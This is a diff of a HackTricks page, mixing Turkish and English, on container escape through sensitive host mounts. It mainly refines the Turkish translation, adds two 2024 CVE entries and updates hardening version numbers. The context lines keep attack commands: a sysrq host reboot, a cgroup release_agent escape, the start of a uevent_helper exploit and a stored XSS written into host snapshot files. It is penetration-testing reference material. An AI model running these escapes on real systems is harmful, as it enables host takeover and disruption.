@@ -4,18 +4,18 @@
 
 `/proc`, `/sys` ve `/var`'ın uygun namespace izolasyonu olmadan açılması, saldırı yüzeyinin genişlemesi ve bilgi sızdırma gibi önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışı, ana makine değişikliği veya daha fazla saldırıyı destekleyen bilgilerin sağlanmasına yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edilirse, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'ı korumasız bırakabilir.
 
-**Her potansiyel zafiyetin daha fazla detayını** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** adresinde bulabilirsiniz.**
+**Her potansiyel zafiyetin daha fazla detayını bulabilirsiniz** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## procfs Vulnerabilities
 
 ### `/proc/sys`
 
-Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirmek için erişime izin verir ve endişe verici birkaç alt dizin içerir:
+Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme erişimine izin verir ve endişe verici birkaç alt dizin içerir:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) belgesinde tanımlanmıştır.
-- Bu dosyaya yazabiliyorsanız, bir boru `|` yazıp ardından bir program veya betiğin yolunu ekleyerek, bir çökme gerçekleştiğinde çalıştırılacak bir komut oluşturabilirsiniz.
+- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) içinde tanımlanmıştır.
+- Bu dosyaya yazabiliyorsanız, bir boru `|` yazmak ve bir çökme gerçekleştiğinde çalıştırılacak bir program veya betiğin yolunu eklemek mümkündür.
 - Bir saldırgan, `mount` komutunu çalıştırarak konteynerinin içindeki ana makinedeki yolu bulabilir ve bu yolu konteyner dosya sistemindeki bir ikili dosyaya yazabilir. Ardından, bir programı çökertip çekirdeğin konteyner dışındaki ikili dosyayı çalıştırmasını sağlayabilir.
 
 - **Test ve Sömürü Örneği**:
@@ -70,7 +70,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
 #### **`/proc/config.gz`**
 
 - `CONFIG_IKCONFIG_PROC` etkinse kernel yapılandırmasını açığa çıkarabilir.
-- Saldırganlar için çalışan kernel'deki zayıflıkları tanımlamakta faydalıdır.
+- Saldırganların çalışan kernel'deki zayıflıkları tanımlaması için faydalıdır.
 
 #### **`/proc/sysrq-trigger`**
 
@@ -101,10 +101,10 @@ echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
 
 #### **`/proc/kcore`**
 
-- Sistemin fiziksel belleğini ELF çekirdek formatında temsil eder.
+- Sistemin fiziksel belleğini ELF core formatında temsil eder.
 - Okuma, ana makine ve diğer konteynerlerin bellek içeriklerini sızdırabilir.
 - Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine yol açabilir.
-- Detaylı kullanım için [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bağlantısına bakın.
+- Detaylı kullanım için [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bakınız.
 
 #### **`/proc/kmem`**
 
@@ -132,7 +132,7 @@ echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
 
 - Kernel cihaz `uevents`'lerini işlemek için kullanılır.
 - `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine rastgele betikler çalıştırabilir.
-- **İstismar için Örnek**:
+- **İstismar Örneği**:
 ```bash
 
 #### Creates a payload
@@ -231,8 +231,7 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="tr"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="tr"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
 
 The XSS was achieved:
@@ -273,10 +272,10 @@ So the filesystems are under `/var/lib/docker/overlay2/`:
 ```bash
 $ sudo ls -la /var/lib/docker/overlay2
 
-drwx--x---  4 root root  4096 9 Oca 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
-drwx--x---  4 root root  4096 11 Oca 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
-drwx--x---  4 root root  4096 9 Oca 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
-drwx--x---  4 root root  4096 9 Oca 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
+drwx--x---  4 root root  4096 9 Oca 22:14  00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
+drwx--x---  4 root root  4096 11 Oca 17:00  03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
+drwx--x---  4 root root  4096 9 Oca 21:23  049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
+drwx--x---  4 root root  4096 9 Oca 21:22  062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
 <SNIP>
 ```
 
@@ -294,7 +293,8 @@ Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent 
 ```text
 /var/run/containerd/containerd.sock     # containerd CRI soketi  
 /var/run/crio/crio.sock                 # CRI-O çalışma zamanı soketi  
-/run/podman/podman.sock                 # Podman API (rootful veya rootless)  
+/run/podman/podman.sock                 # Podman API (rootlu veya rootsuz)  
+/run/buildkit/buildkitd.sock            # BuildKit daemon (rootlu)  
 /var/run/kubelet.sock                   # Kubernetes düğümlerinde Kubelet API  
 /run/firecracker-containerd.sock        # Kata / Firecracker
 ```
@@ -314,7 +314,7 @@ A similar technique works with **crictl**, **podman** or the **kubelet** API onc
 Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
 
 ```bash
-# konteynerin CAP_SYS_ADMIN'e ve savunmasız bir çekirdeğe sahip olduğunu varsayıyoruz
+# konteynerin CAP_SYS_ADMIN ve savunmasız bir çekirdek olduğunu varsayarak
 mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # CVE-2022-0492 gerektirir
@@ -328,7 +328,7 @@ When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**
 ### Mount-Related Escape CVEs (2023-2025)
 
 * **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
-runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+runc ≤ 1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥ 25.0.3, containerd ≥ 1.7.14).
 
 ```Dockerfile
 FROM scratch
@@ -339,11 +339,17 @@ CMD ["/bin/sh"]
 * **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
 A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
 
+* **CVE-2024-1753 – Buildah / Podman bind-mount breakout during `build`**
+Buildah ≤ 1.35.0 (and Podman ≤ 4.9.3) incorrectly resolved absolute paths passed to `--mount=type=bind` in a *Containerfile*. A crafted build stage could mount `/` from the host **read-write** inside the build container when SELinux was disabled or in permissive mode, leading to full escape at build time. Patched in Buildah 1.35.1 and the corresponding Podman 4.9.4 back-port series.
+
+* **CVE-2024-40635 – containerd UID integer overflow**
+Supplying a `User` value larger than `2147483647` in an image config overflowed the 32-bit signed integer and started the process as UID 0 inside the host user namespace. Workloads expected to run as non-root could therefore obtain root privileges. Fixed in containerd 1.6.38 / 1.7.27 / 2.0.4.
+
 ### Hardening Reminders (2025)
 
 1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
 2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
-3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+3. Keep the container runtime up-to-date (runc ≥ 1.1.12, BuildKit ≥ 0.12.5, Buildah ≥ 1.35.1 / Podman ≥ 4.9.4, containerd ≥ 1.7.27).
 4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
 
 ### References
@@ -353,5 +359,7 @@ A race condition in the BuildKit snapshotter let an attacker replace a file that
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
+- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)
 
 {{#include ../../../../banners/hacktricks-training.md}}
